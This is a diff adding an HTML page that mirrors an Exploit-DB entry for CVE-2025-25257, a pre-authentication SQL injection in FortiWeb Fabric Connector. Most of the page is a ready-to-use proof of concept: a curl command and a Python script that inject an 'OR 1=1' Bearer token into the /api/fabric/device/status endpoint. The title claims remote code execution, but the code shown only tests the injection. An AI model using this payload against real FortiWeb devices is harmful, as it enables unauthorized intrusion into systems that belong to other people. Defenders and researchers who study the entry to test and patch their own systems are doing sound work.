@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>OffSec’s Exploit Database Archive</title>
+<style>
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; line-height: 1.8; color: #e2e8f0; max-width: 800px; margin: 40px auto; padding: 0 20px; background: #0a0e27; }
+  h1 { color: #00d9ff; margin-bottom: 0.5em; }
+  .metadata { color: #94a3b8; font-size: 0.9em; margin-bottom: 2em; border-bottom: 1px solid rgba(0,217,255,0.2); padding-bottom: 1em; }
+  img { max-width: 100%; height: auto; border-radius: 8px; }
+  a { color: #00d9ff; }
+  p { margin-bottom: 1em; }
+  blockquote { border-left: 3px solid #825ee4; padding-left: 15px; color: #94a3b8; }
+  code { background: rgba(0,0,0,0.3); padding: 2px 6px; border-radius: 3px; color: #ff79c6; }
+  pre { background: rgba(0,0,0,0.4); padding: 15px; border-radius: 6px; overflow-x: auto; }
+</style>
+</head>
+<body>
+  <h1>OffSec’s Exploit Database Archive</h1>
+  <div class="metadata">
+    Source: Exploit-DB | Date: 2/4/2026 | Lang: EN |
+    <a href="https://www.exploit-db.com/exploits/52473" target="_blank">Original Article</a>
+  </div>
+  <div class="content">
+    <div><div>
+
+                        
+                        <pre><code># Exploit Title: FortiWeb Fabric Connector 7.6.x - Pre-authentication SQL
+Injection to Remote Code Execution
+# Date: 2025-10-05
+# Exploit Author: Milad Karimi (Ex3ptionaL)
+# Contact: miladgrayhat@gmail.com
+# Zone-H: www.zone-h.org/archive/notifier=Ex3ptionaL
+# Tested on: Win, Ubuntu
+# CVE : CVE-2025-25257
+
+Overview
+
+CVE-2025-25257 is a pre-authentication SQL Injection vulnerability in
+Fortinet FortiWeb Fabric Connector versions 7.0 through 7.6.x.
+This flaw allows attackers to inject malicious SQL commands into the
+vulnerable API endpoint, potentially leading to Remote Code Execution (RCE).
+
+
+PoC
+
+curl -k -H "Authorization: Bearer aaa' OR '1'='1" \
+  https://&lt;fortiweb-ip&gt;/api/fabric/device/status
+
+PoC Python
+
+import requests
+
+def test_sqli(base_url):
+    url = f"{base_url}/api/fabric/device/status"
+    headers = {
+        "Authorization": "Bearer aaa' OR '1'='1"
+    }
+    try:
+        response = requests.get(url, headers=headers, verify=False,
+timeout=10)
+        print(f"Status code: {response.status_code}")
+        print("Response body:")
+        print(response.text)
+    except Exception as e:
+        print(f"Error: {e}")
+
+if __name__ == "__main__":
+    import argparse
+    parser = argparse.ArgumentParser(description="PoC SQLi By Ex3ptionaL
+CVE-2025-25257 FortiWeb")
+    parser.add_argument("base_url", help="Base URL of FortiWeb (ex:
+https://10.0.0.5)")
+    args = parser.parse_args()
+    test_sqli(args.base_url)
+# python3 src/poc.py https://10.0.0.5
+            </code></pre>
+
+                    </div></div>
+  </div>
+</body>
+</html>
